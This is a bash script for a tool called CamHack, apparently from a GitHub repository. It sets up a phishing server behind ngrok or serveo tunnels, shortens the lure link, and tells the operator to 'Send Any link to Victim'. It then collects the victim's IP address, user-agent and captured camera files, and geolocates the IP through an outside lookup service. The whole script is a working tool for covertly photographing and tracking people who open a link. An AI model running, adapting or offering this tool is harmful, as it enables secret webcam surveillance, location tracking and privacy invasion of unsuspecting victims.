#!/bin/bash
# CamHack v1.0
# coded by: https://github.com/Hack-The-World-With-Tech/Cam-Hack
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {
clear

printf "\e[1;93m                                                                        \e[0m\n"
printf "\e[1;93m  _____    ___   ___  ___ \e[0m\e[1;92m  _   _    ___    _____   _   __ \e[0m\n"
printf "\e[1;93m /  __ \  / _ \  |  \/  | \e[0m\e[1;92m | | | |  / _ \  /  __ \ | | / / \e[0m\n"
printf "\e[1;93m | /  \/ / /_\ \ | .  . | \e[0m\e[1;92m | |_| | / /_\ \ | /  \/ | |/ /  \e[0m\n"
printf "\e[1;93m | |     |  _  | | |\/| | \e[0m\e[1;92m |  _  | |  _  | | |     |    \  \e[0m\n"
printf "\e[1;93m | \__/\ | | | | | |  | | \e[0m\e[1;92m | | | | | | | | | \__/\ | |\  \ \e[0m\n"
printf "\e[1;93m  \____/ \_| |_/ \_|  |_/ \e[0m\e[1;92m \_| |_/ \_| |_/  \____/ \_| \_/ \e[0m\n"
printf "\e[1;93m                                                                        \e[0m\n"

printf " \e[1;92m C o d e d   B y  \e[0m\e[1;93m S A S I \e[0m \n"

printf "\e[1;31m ╔═╗ \e[0m\e[1;32m ╔═╗ \e[0m\e[1;33m ╔═╗ \e[0m\e[1;34m ╦ \e[0m\n"
printf "\e[1;31m ╚═╗ \e[0m\e[1;32m ╠═╣ \e[0m\e[1;33m ╚═╗ \e[0m\e[1;34m ║ \e[0m\n"
printf "\e[1;31m ╚═╝ \e[0m\e[1;32m ╩ ╩ \e[0m\e[1;33m ╚═╝ \e[0m\e[1;34m ╩ \e[0m\n"

printf " \e[1;77m v1.0 Coded By https://github.com/Hack-The-World-With-Tech/Cam-Hack\e[0m \n"
}


stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}


dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}


start() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

default_redirect="https://youtube.com"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m ): \e[0m" $default_redirect
read redirect_link
redirect_link="${redirect_link:-${default_redirect}}"

if [[ $option_server -eq 2 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
serveo_server

elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi
}


ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
printf "\e[1;92m[\e[0m+\e[1;92m] Please Wait...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;93m[\e[0m+\e[1;93m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;93m[\e[0m+\e[1;93m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
send_ip=$(curl -s https://4h.net/api.php?url=$link)
printf "\n"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Distracting website:\e[0m\e[1;77m %s\n' $redirect_link
printf "\n"
printf "\e[1;91m[\e[0m*\e[1;91m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
printf '\e[1;91m[\e[0m\e[1;77m*\e[0m\e[1;91m] Or using 4th url shortener (https://4h.net/):\e[0m\e[1;77m %s \n' $send_ip

printf "\e[1;91m[\e[0m*\e[1;91m] Send Any link to Victim...\n"
printf "\n"
payload_ngrok
checkfound
}


payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' camhack_ngrok_html.html > home2.html
sed 's+forwarding_link+'$link'+g' camhack_php.php > index.php
sed 's+redirect_link+'$redirect_link'+g'  home2.html > home.html
}


serveo_server() {
default_choose_sub="Y"
default_subdomain="camhack$RANDOM"

printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose subdomain? \e[0m\e[1;77m [Y/n] \e[0m\e[1;92m: \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Subdomain (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

serveo_server_start
serveo_payload
checkfound
}


serveo_server_start() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Starting php server... (localhost:\e[0m\e[1;77m 3333\e[0m\e[1;93m)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
send_ipp=$(curl -s https://4h.net/api.php?url=$send_link)
printf "\n"
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Subdomain:\e[0m\e[1;77m %s\n' $subdomain
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Distracting website:\e[0m\e[1;77m %s\n' $redirect_link
printf "\n"
printf "\e[1;91m[\e[0m*\e[1;91m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $send_link
printf '\e[1;91m[\e[0m\e[1;77m*\e[0m\e[1;91m] Or using 4th url shortener (https://4h.net/):\e[0m\e[1;77m %s \n' $send_ipp
printf "\e[1;91m[\e[0m*\e[1;91m] Send Any link to Victim...\n"
printf "\n"
}


serveo_payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$link'+g' camhack_serveo_html.html > home2.html
sed 's+forwarding_link+'$link'+g' camhack_php.php > index.php
sed 's+redirect_link+'$redirect_link'+g'  home2.html > home.html
}


checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 
}


catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m saved.ip.txt\e[0m\n"
cat ip.txt >> saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"

hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##

if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

capital=$(grep -o 'Capital:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $capital != "" ]]; then
printf "\e[1;92m[*] IP Capital:\e[0m\e[1;77m %s\e[0m\n" $capital
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##

city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

iplanguage=$(grep -o "IP Language:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $iplanguage != "" ]]; then
printf "\e[1;92m[*] IP Country Language:\e[0m\e[1;77m %s\e[0m\n" $iplanguage
fi
##

ipidd=$(grep -o "IDD Code:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ipidd != "" ]]; then
printf "\e[1;92m[*] IP Country IDD Code:\e[0m\e[1;77m %s\e[0m\n" $ipidd
fi
##

iptimezone=$(grep -o "Time Zone:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $iptimezone != "" ]]; then
printf "\e[1;92m[*] Time Zone:\e[0m\e[1;77m %s\e[0m\n" $iptimezone
fi
##

iplocaltime=$(grep -o "Local Time:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $iplocaltime != "" ]]; then
printf "\e[1;92m[*] Local Time (Now):\e[0m\e[1;77m %s\e[0m\n" $iplocaltime
fi
##

ipsun=$(grep -o "Sunrise / Sunset:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ipsun != "" ]]; then
printf "\e[1;92m[*] Sunrise / Sunset (Today):\e[0m\e[1;77m %s\e[0m\n" $ipsun
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##

ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"

printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For Credentials, Press Ctrl + C to exit...\e[0m\n"
}


banner
dependencies
start
